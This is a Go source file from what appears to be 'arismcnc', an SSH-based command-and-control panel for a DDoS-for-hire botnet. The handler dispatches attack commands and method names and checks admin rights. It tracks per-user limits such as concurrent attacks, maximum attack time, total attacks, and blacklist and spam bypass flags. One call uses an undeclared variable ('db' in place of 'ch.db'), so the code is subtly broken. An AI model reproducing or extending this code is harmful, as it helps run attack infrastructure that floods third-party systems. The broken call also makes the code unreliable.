package handlers

import (
	"fmt"
	"io"
	"log"
	"strconv"
	"strings"
	"time"

	"arismcnc/commands/cmds"
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"

	"github.com/gliderlabs/ssh"
)

type CommandHandler struct {
	commands map[string]cmds.Command
	db       *database.Database
	session  ssh.Session
}


func NewCommandHandler(db *database.Database, session ssh.Session) *CommandHandler {
	handler := &CommandHandler{
		commands: make(map[string]cmds.Command),
		db:       db,
		session:  session,
	}
	handler.loadCommands()
	return handler
}


func (ch *CommandHandler) loadCommands() {
	
	for _, command := range cmds.CommandMap {
		ch.registerCommand(command)

		
		for _, alias := range command.Aliases() {
			ch.commands[alias] = command
		}
	}
}


func (ch *CommandHandler) registerCommand(command cmds.Command) {
	ch.commands[command.Name()] = command
}


func (ch *CommandHandler) ExecuteCommand(input string, output io.Writer) {
	args := strings.Fields(input)
	if len(args) == 0 {
		return
	}

	commandName := args[0]
	command, exists := ch.commands[commandName]
	if !exists {
		methods := utils.GetMethodsList()
		if !managers.Contains(methods, args[0]) {
			fmt.Fprintf(output, "Unknown command: %s\n", commandName)
		}
		return
	}

	if command.AdminOnly() {
		userInfo := ch.db.GetAccountInfo(ch.session.User())
		if userInfo.Admin != 1 {
			expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
			if err != nil {
				log.Print(err)
			}

			insufficientPermissionsBrand := utils.Branding(ch.session, "insufficient-permissions", map[string]interface{}{
				"user.Username":            ch.session.User(),
				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
				"user.Admin":               utils.CalculateInt(userInfo.Admin),
				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
				"user.Private":             utils.CalculateInt(userInfo.Private),
				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
				"user.SSH_Client":          ch.session.Context().ClientVersion(),
				"user.Created_by":          userInfo.CreatedBy,
				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
				"clear":                    "\x1b[2J \x1b[H",
				"sleep": func(duration int) {
					time.Sleep(time.Duration(duration) * time.Millisecond)
				},
			})
			fmt.Fprintln(output, insufficientPermissionsBrand)
			return
		}
	}

	command.Execute(ch.session, ch.db, args[1:], output)
}
